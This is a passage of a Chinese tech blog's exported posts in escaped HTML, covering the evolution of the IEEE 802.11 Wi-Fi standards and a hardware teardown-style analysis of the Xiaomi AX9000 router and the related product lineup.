Reused</td>\n<td>空间重用</td>\n</tr>\n<tr>\n<td>TWT</td>\n<td>Target Wake Times</td>\n<td>目标唤醒时间</td>\n</tr>\n<tr>\n<td>BPSK</td>\n<td>Binary Phase Shift Keying</td>\n<td>二相相移键控</td>\n</tr>\n<tr>\n<td>QPSK</td>\n<td>Quadrature Phase Shift Keying</td>\n<td>四相相移键控信号</td>\n</tr>\n<tr>\n<td>QAM</td>\n<td>Quadrature Amplitude Modulation</td>\n<td>正交幅度调制 ,16QAM是指包含16种符号的QAM调制方式，256QAM，1024QAM等类似</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11\">IEEE 802.11 的 Wiki</a></li>\n<li><a href=\"https://www.intel.cn/content/www/cn/zh/gaming/resources/wifi-6.html\">Intel关于Wifi 6的介绍</a></li>\n<li><a href=\"http://www.semiinsights.com/s/electronic_components/23/38911.shtml\">关于WiFi 6技术，这篇说得最详细</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/373074671\">什么是调制、为什么要调制、调制有哪些？</a></li>\n<li><a href=\"https://www.elettroamici.org/zh/modulazione-digitale/\">数字调制技术的对比分析</a></li>\n<li><a href=\"https://www.ruijie.com.cn/fa/xw-hlw/81858/\">第七代无线技术802.11ax详解</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a44484.html\">Wi-Fi 技术的演进</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/359250747\">WIFI6技术概述</a></li>\n<li><a href=\"https://www.mwrf.net/tech/tm/2021/28003.html\">802.11ax（Wi-Fi 6）技术简介和射频测试</a></li>\n</ul>\n<h3 id=\"资料下载\"><a href=\"#资料下载\" class=\"headerlink\" title=\"资料下载\"></a>资料下载</h3><ul>\n<li><a href=\"80211ax%E6%8A%80%E6%9C%AF%E7%99%BD%E7%9A%AE%E4%B9%A6.pdf\">IEEE 802.11ax 技术白皮书 - H3C</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之二：技术标准","url":"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/","content":"<p>Wi-Fi背后的技术标准，是由美国的电气电子工程师协会（IEEE）制定的802.11系列协议，主要包含几个物理层（PHY）规范和一个链路层（MAC）规范。</p>\n<blockquote>\n<p>IEEE 802.11的链路层规范为CSMA&#x2F;CA（载波侦听多路访问&#x2F;碰撞避免），与以太网IEEE 802.3的CSMA&#x2F;CD（载波侦听多路访问&#x2F;冲突检测）非常相似</p>\n</blockquote>\n<p>从1997年的第一个版本开始，802.11系列协议不断向前演进，经历了802.11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac等多个版本，支持的上网速率也不断提升。目前最新的协议版本是802.11ax，也就是近年来迅速发展的Wi-Fi 6。</p>\n<h2 id=\"一、Wi-Fi技术标准的演进\"><a href=\"#一、Wi-Fi技术标准的演进\" class=\"headerlink\" title=\"一、Wi-Fi技术标准的演进\"></a>一、Wi-Fi技术标准的演进</h2><img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/wifi.png\" class=\"\">\n\n<h3 id=\"IEEE-802-11a-b-g-Wi-FI-1-2-3\"><a href=\"#IEEE-802-11a-b-g-Wi-FI-1-2-3\" class=\"headerlink\" title=\"IEEE 802.11a&#x2F;b&#x2F;g &#x3D; Wi-FI 1&#x2F;2&#x2F;3\"></a>IEEE 802.11a&#x2F;b&#x2F;g &#x3D; Wi-FI 1&#x2F;2&#x2F;3</h3><p>IEEE 802.11<br>创建于1997年，数据传输速率仅有 2Mbps，由于互操作性问题、成本和缺乏足够的吞吐量，该协议未被广泛接受，但它改变了用户的接入方式。</p>\n<p>IEEE 802.11a<br>创建于1999年，首次支持5GHz频段，最大数据速率高达54Mbps。<br>由于各国对于5GHz频段开放存在争议，而且存在覆盖范围小、产品成本高、研发进度慢、与802.11b不兼容等问题而未被广泛接受。</p>\n<p>IEEE 802.11b<br>也在1999年创建的，它使用更典型的2.4GHz频带，并且可以达到11Mbps的最大速度。<br>与IEEE 802.11a实际上形成竞争关系，苹果公司的iBook是第一个搭载Wi-Fi的主流产品。</p>\n<p>IEEE 802.11g<br>发布于2003年，使用与802.11a相同的OFDM技术，同样支持54Mbps的最大理论速率，但改为使用相对可靠的2.4GHz频段。<br>802.11g 向后兼容 802.11b（即 802.11b 设备可以连接到 802.11g 接入点）。</p>\n<h3 id=\"IEEE-802-11n-Wi-Fi-4\"><a href=\"#IEEE-802-11n-Wi-Fi-4\" class=\"headerlink\" title=\"IEEE 802.11n &#x3D; Wi-Fi 4\"></a>IEEE 802.11n &#x3D; Wi-Fi 4</h3><p>2009年发布，多项先进技术的引入让Wi-Fi变得更快、更可靠，也是第一个可以在我国合法使用的Wi-Fi标准，使得Wi-Fi真正成为业界主流技术。</p>\n<ul>\n<li>第一次同时支持2.4GHz频段和5GHz频段</li>\n<li>使用20Mhz或40Mhz信道宽度，最大传输速度理论值为600Mbit&#x2F;s</li>\n<li>初期最高支持64-QAM调制，后期增加对于256-QAM高阶调制的可选支持，使其理论速率达到了最高800Mbit&#x2F;s</li>\n<li>首次引入MIMO（多输入多输出系统），支持波束成形，空间复用等重要功能</li>\n</ul>\n<h3 id=\"IEEE-802-11ac-Wi-Fi-5\"><a href=\"#IEEE-802-11ac-Wi-Fi-5\" class=\"headerlink\" title=\"IEEE 802.11ac &#x3D; Wi-Fi 5\"></a>IEEE 802.11ac &#x3D; Wi-Fi 5</h3><p>2014年推出802.11ac Wave1，2016年推出802.11ac Wave2。</p>\n<ul>\n<li>仅支持5GHz频段，因此<strong>ac双频路由器的2.4GHz部分只能工作在802.11n模式</strong></li>\n<li>大幅提高数据吞吐量，首次支持80MHz信道宽度，单流最高速率可达每秒1300Mbps；理论支持160MHz信道，最高理论速度可达6.77Gbps</li>\n<li>支持256-QAM，支持Multi-User MIMO（仅下行方向，最高8x8 MIMO），路由器可以使用不同的空间流（天线）与不同的设备进行通信</li>\n</ul>\n<h3 id=\"IEEE-802-11ax-Wi-Fi-6\"><a href=\"#IEEE-802-11ax-Wi-Fi-6\" class=\"headerlink\" title=\"IEEE 802.11ax &#x3D; Wi-Fi 6\"></a>IEEE 802.11ax &#x3D; Wi-Fi 6</h3><p>发布于2019年，是当前最新的Wi-Fi技术标准，也是<strong>第一次使用Wi-Fi 6的商业推广名称</strong></p>\n<ul>\n<li>同时工作在2.4GHz与5GHz频段上，向下兼容11a&#x2F;b&#x2F;g&#x2F;n&#x2F;ac，</li>\n<li>支持160MHz信道，最大传输速度理论值为9.6Gbps，标称吞吐量提升4倍，传输速率提升37%，延迟下降75%</li>\n<li>支持1024-QAM，MU-MIMO技术成为标配（最大8x8 MIMO），且同时支持上行与下行</li>\n<li>引入了OFDMA（频分复用技术）、BSS着色机制等先进技术</li>\n</ul>\n<h2 id=\"二、重要的辅助标准\"><a href=\"#二、重要的辅助标准\" class=\"headerlink\" title=\"二、重要的辅助标准\"></a>二、重要的辅助标准</h2><h3 id=\"802-11i-2004-WAP2\"><a href=\"#802-11i-2004-WAP2\" class=\"headerlink\" title=\"802.11i-2004 &#x3D; WAP2\"></a>802.11i-2004 &#x3D; WAP2</h3><p>802.11-1999的基础安全规范（MAC层）采用WEP标准，由于被证明存在安全漏洞，2004年发布了<a href=\"https://en.wikipedia.org/wiki/IEEE_802.11i-2004\">IEEE 802.11i-2004</a>，Wi-Fi联盟称为WAP2，这也是现在的主流方案。<br>其核心技术是四次握手和组密钥（GTK）握手，初始身份验证过程使用预共享密钥(PSK) 或通过 802.1X进行EAP交换后执行，采用AES加密算法。</p>\n<blockquote>\n<p>2003年，中国制定了一个与IEEE 802.11i存在较大差异的无线局域网国家标准WAPI，并积极推动纳入ISO规范标准……<br>经过漫长的中美贸易争端谈判，2011年中国政府申请撤回WAPI标准提案。</p>\n</blockquote>\n<h3 id=\"802-11h-Auto-DFS-Auto-TPC\"><a href=\"#802-11h-Auto-DFS-Auto-TPC\" class=\"headerlink\" title=\"802.11h &#x3D; Auto DFS + Auto TPC\"></a>802.11h &#x3D; Auto DFS + Auto TPC</h3><p>在频率规划中已经提到，本规范旨在引入两个主要特征：动态频率选择(DFS)和发射功率控制(TPC)。</p>\n<p>DFS作为频谱管理（主要与雷达协作）和TPC，用于限制无线设备的整体射频“污染”。<br>DFS通常与Mesh关联，但它只与室外（甚至室内区域听到室外信号并在室内&#x2F;室外信道上运行）相关。<br>由于2.4Ghz频段没有雷达，因此DFS规则仅适用于5GHz频段。</p>\n<h3 id=\"802-11k-v-r-无线Mesh\"><a href=\"#802-11k-v-r-无线Mesh\" class=\"headerlink\" title=\"802.11k&#x2F;v&#x2F;r &#x3D; 无线Mesh\"></a>802.11k&#x2F;v&#x2F;r &#x3D; 无线Mesh</h3><p>为实现Wi-Fi无缝漫游而定义的一组协议，通常简写为802.11k&#x2F;v&#x2F;r，所谓的MESH路由器就是依靠这三个协议实现不同的路由器节点之间的漫游。</p>\n<ul>\n<li>802.11k：拓扑感知的基础协议，负责测量附近节点的无线电资源信息并告知客户端，帮助客户端实现BBS切换，核心数据是邻近AP节点列表</li>\n<li>802.11v：漫游切换的核心协议，负责多个BBS的切换管理，通过算法协议让信号不好的终端设备更换AP</li>\n<li>802.11r：快速认证的辅助协议，负责网络切换时的快速认证方法，减少客户端切换节点的等待时间，尽量不让用户感觉到切换节点</li>\n</ul>\n<p>需要注意的是，节点AP和终端设备必须都支持k&#x2F;v&#x2F;r协议时，漫游功能才能实现。<br>苹果终端设备从iphone4s开始就支持这三个协议，三星终端设备从2019年开始支持。<br>许多低端路由器只支持K和V这两个协议，并不支持R协议，但其事实上并不影响漫游切换，仅是切换时长略长一些（60ms左右）。</p>\n<h2 id=\"三、几个另类的技术标准\"><a href=\"#三、几个另类的技术标准\" class=\"headerlink\" title=\"三、几个另类的技术标准\"></a>三、几个另类的技术标准</h2><p>Wi-Fi技术在局域网领域的巨大成功，也催生Wi-Fi联盟试图在相关领域的积极拓展，一是从室内走向室外，二是从网络设备走向终端设备。</p>\n<img src=\"/2022/03/27/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%8A%80%E6%9C%AF%E6%A0%87%E5%87%86/ieee.jpg\" class=\"\">\n\n<h3 id=\"802-11af-广域网\"><a href=\"#802-11af-广域网\" class=\"headerlink\" title=\"802.11af &#x3D; 广域网\"></a>802.11af &#x3D; 广域网</h3><p>802.11af也被称为超级Wi-Fi或White-Fi，是一个面向长距离通信服务的协议，主要特点是：</p>\n<ul>\n<li>希望利用电视VHF与UHF两个频段中没有使用的部分空白频谱资源，授予无线宽带网络使用，由于频率较低，信号干扰较少，可以支持数公里范围的传输</li>\n<li>物理层基于802.11ac，同样支持OFDM技术</li>\n<li>采用6-8Mhz的频率带宽，提供26.7-35.6Mbps的无线网络传输速率</li>\n</ul>\n<p>美国FCC提出的“超级Wi-Fi网络”的提案，遭到AT&amp;T、T-Mobile、Verizon、英特尔、高通等专注于移动通信的公司，以及电视广播业和使用无线麦克风等行业的强烈反对，其理由为“超级Wi-Fi网络”的管理存在问题，容易在大城市中出现网络拥堵的状况。同时，“超级Wi-Fi网络”干扰的问题还没有得到解决，将会影响移动通信行业收入。</p>\n<h3 id=\"802-11ah-物联网\"><a href=\"#802-11ah-物联网\" class=\"headerlink\" title=\"802.11ah &#x3D; 物联网\"></a>802.11ah &#x3D; 物联网</h3><p>802.11ah是一个为物联网IoT场景设计的专项协议，主要特点是：</p>\n<ul>\n<li>面向“大连接”，强调节能低功耗，速率较低（150Kps-18Mbps）</li>\n<li>设计工作在900MHz频段，由于该频段需要政府许可，商用难度很高</li>\n</ul>\n<p>802.11ah是协议组的命名，而HaLow是Wi-Fi联盟对于802.11ah协议的命名。HaLow这个命名其实算是非常不错的，有几种说法：<br>1）Low代表的是低功耗，而Ha可以代表”Hay-“或者”Halo”。<br>2）HaLow整体的命名接近于Hello，比较好记。<br>3）Ha还有一种意思可以理解，就是其是倒过来的aH，也就是代表了802.11ah。</p>\n<h3 id=\"802-11ad-802-11ay-无线硬盘\"><a href=\"#802-11ad-802-11ay-无线硬盘\" class=\"headerlink\" title=\"802.11ad &amp; 802.11ay &#x3D; 无线硬盘\"></a>802.11ad &amp; 802.11ay &#x3D; 无线硬盘</h3><p>这两个标准一脉相承，目标是室内的高速数据传输，例如高清视频播放等，基本特点是：</p>\n<ul>\n<li>基于60GHz的毫米波技术，支持高达7Gbps的传输速率</li>\n<li>由于采用高频段，信号不能穿透墙壁，并且要求直线传输</li>\n<li>多千兆无线系统（MGWS）标准，并且是WiGig网络的网络标准。因为它使用了V精密带的毫米波（MMW）频率</li>\n</ul>\n<p>IEEE 802.11ay是802.11ad的后继版本，引入MIMO技术与通道捆合技术(Channel Bonding)机制，并支援更高阶的调变机制(最高可达256-QAM)。</p>\n<p>2018年，高通公司宣布推出业界首款基于新的WiGig标准802.11ay的60GHz Wi－Fi解决方案，可以提供实现游戏和娱乐新体验，例如4K流媒体直播、无延迟移动屏幕投射到娱乐系统以及真正身临其境的无线虚拟和增强现实体验。</p>\n<h2 id=\"附录一：802-11的PHY（物理层）规范\"><a href=\"#附录一：802-11的PHY（物理层）规范\" class=\"headerlink\" title=\"附录一：802.11的PHY（物理层）规范\"></a>附录一：802.11的PHY（物理层）规范</h2><p>在描述Wi-Fi的信道速率时，经常看到HE160、VHT80等名词，其实这是802.11标准中关于PHY规范的名称，对应着Wi-Fi等各个标准。</p>\n<ul>\n<li><strong>HT &#x3D; 802.11n</strong>：2009年发布，规范名称为“High-throughput (HT) PHY specification”，即：高吞吐量（HT）PHY规范，定义了20MHz、40MHz等2种模式，最大2条流，调制方式为 MIMO-OFDM</li>\n<li><strong>VHT &#x3D; 802.11ac</strong>：2013年发布，规范名称为“Very high throughput (VHT) PHY specification”，，即：超高吞吐量（VHT）PHY规范定义了20MHz、40MHz、80MHz、160MHz、80MHz+80MHz等5种模式，最大8条流，调制方式为 MIMO-OFDM，不支持2.4GHz频段</li>\n<li><strong>HE &#x3D; 802.11ax</strong>，2020年发布，规范名称为“High Efficiency(HE) PHY specification”，即：高效（HE）PHY规范，定义了20MHz、40MHz、80MHz、160MHz等4种模式，最大8条流，调制方式为OFDMA</li>\n</ul>\n<p>此外，还有几个有意思的PHY规范：</p>\n<ul>\n<li><strong>DMG &#x3D; 802.11ad</strong>：2012年发布，对应规范为“Directional multi-gigabit (DMG) PHY specification”，即：定向多吉比特（DMG）PHY规范，工作在60GHz频段，不支持多流，调制方式为 OFDM，单载波，低功耗单载波。</li>\n<li><strong>TVHT &#x3D; 802.11af</strong>：2014年发布，对应规范为“Television very high throughput (TVHT) PHY specification”，即：电视超高吞吐量（TVHT）PHY规范，工作在电视的空白频段，最大4条流，调制方式为 MIMO-OFDM</li>\n</ul>\n<h2 id=\"附录二：以太网标准-IEEE-802-3\"><a href=\"#附录二：以太网标准-IEEE-802-3\" class=\"headerlink\" title=\"附录二：以太网标准 IEEE 802.3\"></a>附录二：以太网标准 IEEE 802.3</h2><p>IEEE 802.3标准是由Ethernet V2发展而来。它将Ethernet V2帧头的协议类型字段替换为帧长度字段，并加入802.2 LLC头用以标志上层协议。<br>其定义了有线以太网的物理层和数据链路层的媒体访问控制(MAC) ，通常用于局域网(LAN) ，基于各种类型的铜缆或光纤电缆在节点（集线器、交换机、路由器）之间建立物理连接。<br>多数场景采用CSMA&#x2F;CD协议，即：载波侦听多路访问&#x2F;碰撞检测（Carrier Sense Multiple Access with Collision Detection），也支持CSMA&#x2F;CA协议（Collision Avoidance）。</p>\n<ul>\n<li><strong>802.3</strong> &#x3D; 10M以太网</li>\n<li><strong>802.3a</strong> &#x3D; 百兆以太网</li>\n<li><strong>802.3ab</strong> &#x3D; 基于双绞线的千兆以太网</li>\n<li><strong>802.3z</strong> &#x3D; 基于光纤的千兆以太网</li>\n<li><strong>802.3ad</strong> &#x3D; 双链路聚合的2.5G</li>\n<li><strong>802.3af</strong> &#x3D; 基于以太网的供电，即POE（Power over Ethernet）</li>\n<li><strong>802.3aq</strong> &#x3D; 基于多模光纤的万兆以太网，速率为 10 Gbit&#x2F;s (1,250 MB&#x2F;s)</li>\n</ul>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11ax\">IEEE 802.11ax 的 Wiki</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/IEEE_802.11\">IEEE 802.11 的 Wiki</a></li>\n<li><a href=\"https://www.zhihu.com/question/39183519/answer/1156959383\">如何看待 WiFi 联盟发布的 802.11ah WiFi 标准 “HaLow” ？</a></li>\n<li><a href=\"http://www.semiinsights.com/s/electronic_components/23/38911.shtml\">关于WiFi 6技术，这篇说得最详细</a></li>\n<li><a href=\"https://www.ruijie.com.cn/fa/xw-hlw/81858/\">第七代无线技术802.11ax详解</a></li>\n<li><a href=\"https://www.eet-china.com/mp/a44484.html\">Wi-Fi 技术的演进</a></li>\n</ul>\n"},{"title":"Wi-Fi 6的技术专题之四：产品分析","url":"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/","content":"<p>2014年，雷军发布了小米第一台路由器，号称要引领路由器市场的革命，定位是家庭网络入口，形态是路由器+NAS存储。理想很丰满、现实很骨感！两个都想做，两个都做不好，路由器的网络质量屡屡被吐槽，口碑炸裂。。。<br>从Wi-Fi 6开始，小米痛下决心只做纯粹的路由器，招安了斐讯研发团队，芯片也转向高通的整体方案。从早期的AX1800初入江湖到 Redmi AX5\\AX6补全产品线，从AX3600开始普及家用Wi-Fi 6再到AX6000紧跟手机SOC的发展进一步提高无线规格，小米路由器在逐渐在中高端站稳了脚跟，有了进一步向更高层冲击的实力。<br>2021年，小米发布了高端旗舰路由器小米AX9000，这是小米对于Wi-Fi 6时代何为顶级路由器的答卷，更代表着小米踏上了千元高端路由领域新的征程，请参见<a href=\"https://www.mi.com/mirouter/ax9000/specs\">官方主页</a>。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%9F%BA%E6%9C%AC%E5%8F%82%E6%95%B0.png\" class=\"\">\n\n<h2 id=\"一、AX9000的来由\"><a href=\"#一、AX9000的来由\" class=\"headerlink\" title=\"一、AX9000的来由\"></a>一、AX9000的来由</h2><p>小米AX9000路由器，AX代表其采用IEEE 802.11ax标准，那9000是怎么来的呢，其实是多组天线并发的最大速率。当然，这仅仅是理论速率！</p>\n<ul>\n<li>2.4GHz频段：最大速率1147Mbps &#x3D; 4 * 286.8 ，基于HE40、MSC 11、4*4 MIMO</li>\n<li>5.2GHz频段：最大速率4804Mbps &#x3D; 4 * 1201 ，基于HE160、MSC 11、4*4 MIMO</li>\n<li>5.8GHz频段：最大速率2402Mbps &#x3D; 4 * 600.5 ，基于HE180、MSC 11、4*4 MIMO</li>\n</ul>\n<p>此外，小米路由器为智能家居设置了AIoT专用天线，但为了兼容低端设备仅支持802.11ac。</p>\n<ul>\n<li>2.4GHz频段：最大速率150Mbps，基于VHT40、MSC 7</li>\n<li>5GHz频段：最大速率433Mbps，基于VHT80、MSC 9</li>\n</ul>\n<p><code>1147 + 4804 + 2402 + 150 + 433 = 8936</code>，取个整数就是9000了！！！</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/ax9000.png\" class=\"\">\n\n<h2 id=\"二、核心芯片\"><a href=\"#二、核心芯片\" class=\"headerlink\" title=\"二、核心芯片\"></a>二、核心芯片</h2><p>小米现在采用高通的全套方案，产品发布价格999元，但由于全球芯片短缺，现在顺势涨价到1299元，但仍然经常缺货。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%B0%8F%E7%B1%B3AX9000.jpeg\" class=\"\">\n\n<h3 id=\"核心处理模组\"><a href=\"#核心处理模组\" class=\"headerlink\" title=\"核心处理模组\"></a>核心处理模组</h3><ul>\n<li>CPU：Qualcomm IPQ8072A * 1，四核2.2GHz，A53架构，14nm制程，内建双核1.7GHz NPU</li>\n<li>内存：EtronTech M6HE16EWAKG-10H * 2，DDR3L，单个512MB，总计1GB，台湾钰创科技</li>\n<li>闪存：Winbond W29N02GZSIBA * 1，容量256MB，台湾华邦电子</li>\n</ul>\n<h3 id=\"5-2GHz通信模组\"><a href=\"#5-2GHz通信模组\" class=\"headerlink\" title=\"5.2GHz通信模组\"></a>5.2GHz通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN9024 * 1，高档配置，支持4x4 HE160，最高速率4804Mbps，在2x2 MIMO下支持4096-QAM</li>\n<li>射频前端：Qorvo QCN5054 * 4，分别连接4根外置天线</li>\n<li>介质滤波器：5235 * 4，过滤5.8GHz频段干扰，信号衰减2dB。注意：5235指的是仅允许5.235Hz频率通过！</li>\n</ul>\n<h3 id=\"5-8GHz通信模组\"><a href=\"#5-8GHz通信模组\" class=\"headerlink\" title=\"5.8GHz通信模组\"></a>5.8GHz通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN5054 * 1，中档配置，支持4x4 HE160 或 2×2 HE160，不支持4096-QAM</li>\n<li>射频前端：Qorvo QCN5054 * 4，分别连接4根外置天线</li>\n<li>介质滤波器：5697 * 4，过滤5.2GHz频段干扰，信号衰减2dB，功能同上</li>\n</ul>\n<h3 id=\"2-4GHZ通信模组\"><a href=\"#2-4GHZ通信模组\" class=\"headerlink\" title=\"2.4GHZ通信模组\"></a>2.4GHZ通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCN5024 * 1，中档配置，支持4x4 HE40，最高速率1147Mbps</li>\n<li>射频前端：Qorvo QPF4288 * 4，分别连接4根外置天线。滤波器就不需要了</li>\n</ul>\n<h3 id=\"AIoT通信模组\"><a href=\"#AIoT通信模组\" class=\"headerlink\" title=\"AIoT通信模组\"></a>AIoT通信模组</h3><ul>\n<li>无线芯片：Qualcomm QCA9889 * 1，低档配置，仅支持802.11ac协议，不支持MIMO；2.4G最高速率150Mbps，5G是高速率433Mbps</li>\n<li>射频前端：无，连接1根内置双频天线</li>\n</ul>\n<h3 id=\"其他辅助芯片\"><a href=\"#其他辅助芯片\" class=\"headerlink\" title=\"其他辅助芯片\"></a>其他辅助芯片</h3><ul>\n<li>Qualcomm QCA8075 * 1：负责连接5个千兆以太网的物理接口</li>\n<li>Qualcomm QCA8081 * 1：负责连接2.5G的双链路聚合LAN口，由用户决定用于WAN或者LAN</li>\n<li>Qualcomm PMP8074 * 1：与高通CPU配套的电源管理芯片，负责管理CPU的供电</li>\n</ul>\n<blockquote>\n<p>AX9000有三组无线芯片，每组均有4个FEM芯片和4根外置天线，这就是“三频路由器”的原因<br>FEM，Front-end Modules，即就是前端模块，负责射频信号的发送放大以及接收放大、滤波，甚至包含功率检测、控制和开关等作用。主流厂家包括美国的Skyworks、Qorvo，台湾的Richwave，国内的康希通信。<br>AIoT就是个垃圾！只负责米家智能设备的自动接入和同步资料，其他终端设备均无法使用，刷刷数据还要涨价！</p>\n</blockquote>\n<h2 id=\"三、天线组件\"><a href=\"#三、天线组件\" class=\"headerlink\" title=\"三、天线组件\"></a>三、天线组件</h2><h3 id=\"外置天线\"><a href=\"#外置天线\" class=\"headerlink\" title=\"外置天线\"></a>外置天线</h3><p>小米AX9000共有12根外置天线，在顶部分为4组，每组包含2.4GHz、5.2GHz和5.8GHz各1根。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%9B%9B%E6%A0%B9%E5%A4%A9%E7%BA%BF.jpg\" class=\"\">\n\n<p>小米把5.2GHz称为电竞频段5G_GAME，理由是有160MHz带宽，哪家的路由器不是这个参数呢？<br>两根5G天线的位置分开，且PCB天线的平面是相互垂直的，这样布局倒是有利于减少干扰。</p>\n<img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/%E5%A4%A9%E7%BA%BF.jpeg\" class=\"\">\n\n<p>三频路由器对于Mesh组网有帮助。在没有有线回程的情况下，如果使用两台AX9000组网，可以利用完整的5.2G频段承担起无线回程的重任，保证接入的终端设备可以全带宽运行；但是如果其中一台是双频路由器的话，就只能分享5G频段了。</p>\n<h3 id=\"AIoT天线\"><a href=\"#AIoT天线\" class=\"headerlink\" title=\"AIoT天线\"></a>AIoT天线</h3><img src=\"/2022/03/29/Wi-Fi-6%E7%9A%84%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%BA%A7%E5%93%81%E5%88%86%E6%9E%90/AIoT%E5%A4%A9%E7%BA%BF.jpg\" class=\"\">\n\n<p>红色框里的是AIoT天线，贴在机身内侧，是双频天线。据说位置有讲究，与相邻的2.4G不能近于15CM，与5G不能近于7CM。</p>\n<h2 id=\"四、全产品矩阵\"><a href=\"#四、全产品矩阵\" class=\"headerlink\" title=\"四、全产品矩阵\"></a>四、全产品矩阵</h2><h3 id=\"主流产品\"><a href=\"#主流产品\" class=\"headerlink\" title=\"主流产品\"></a>主流产品</h3><table>\n<thead>\n<tr>\n<th align=\"center\">型号</th>\n<th align=\"center\">定位</th>\n<th align=\"center\">售价</th>\n<th align=\"center\">性能参数</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">小米AX9000</td>\n<td align=\"center\">旗舰</td>\n<td align=\"center\">1299</td>\n<td align=\"center\">IPQ8072A，1GB，QCN5024 + QCN9024 + QCN5054 <br> 外置天线12根，1147+2402+4804+583</td>\n<td align=\"center\">唯一的三频路由器</td>\n</tr>\n<tr>\n<td align=\"center\">小米AX6000</td>\n<td align=\"center\">中档</td>\n<td align=\"center\">599</td>\n<td align=\"center\">IPQ5018，512MB，QCN9024 <br> 外置天线6+1根，574+4804+583</td>\n<td align=\"center\">小米AX3600的马甲</td>\n</tr>\n<tr>\n<td align=\"center\">小米AX3000</td>\n<td align=\"center\">入门</td>\n<td align=\"center\">349</td>\n<td align=\"center\">IPQ5000，256MB，QCN6102 <br> 隐藏天线4根，574+2402</td>\n<td align=\"center\">红米同款的颜值货</td>\n</tr>\n<tr>\n<td align=\"center\">红米AX5400</td>\n<td align=\"center\">中档</td>\n<td align=\"center\">399</td>\n<td align=\"center\">IPQ5018，512MB，QCN9024 <br> 外置天线6根，574+4804</td>\n<td align=\"center\">红米AX6的马甲</td>\n</tr>\n<tr>\n<td align=\"center\">红米AX3000</td>\n<td align=\"center\">实惠</td>\n<td align=\"center\">269</td>\n<td align=\"center\">IPQ5000，256MB，QCN6102 <br> 外置天线4根，574+2402</td>\n<td align=\"center\"><a href=\"%E7%BA%A2%E7%B1%B3AX3000.jpg\">从节点的首选</a></td>\n</tr>\n</tbody></table>\n<ol>\n<li>关于核心CPU，中低档路由器均采用<a href=\"IPQ5x.png\">高通5x系列</a>，2核A53+1核NPU，而且内部集成2.4GHz Wi-Fi6也需要消耗CPU资源。<br>相比之下，AX9000采用的8x系列，4核A53+2核NPU，性能更强悍，且每个频段都有独立无线芯片，因此主板带宽充足，有效解决吞吐量瓶颈。</li>\n<li>关于5GHz频段，中档路由器采用1个QCN9024（高通旗舰QCN9074阉割了6GHz功能的高档货），低档采用1个QCN6012，因此都是双频路由器。<br>相比之下，AX9000的5.2GHz频段也是QCN9024，但5.8GHz频段的无线芯片采用5x系列，比中档路由器的6x系列更差，有偷工减料的嫌疑；而且QCN5024似乎仅支持2*2 MIMO，难道宣传2.4GHz的1147Mbps是假的？</li>\n<li>关于天线，中低档路由器2.4GHz的天线都是2根，仅支持2 * 2 MIMO，区别是在5GHz频段，低档是2根天线支持2 * 2 MIMO；中档是4根天线支持4 * 4 MIMO。</li>\n<li>关于内存，也是一个明显的区隔指标，分别是1024MB、512MB和256MB。</li>\n<li>好消息是，AX系列全部产品均支持Mesh组网！当然，必须都是小米品牌的。</li>\n</ol>\n<h3 id=\"其他产品\"><a href=\"#其他产品\" class=\"headerlink\" 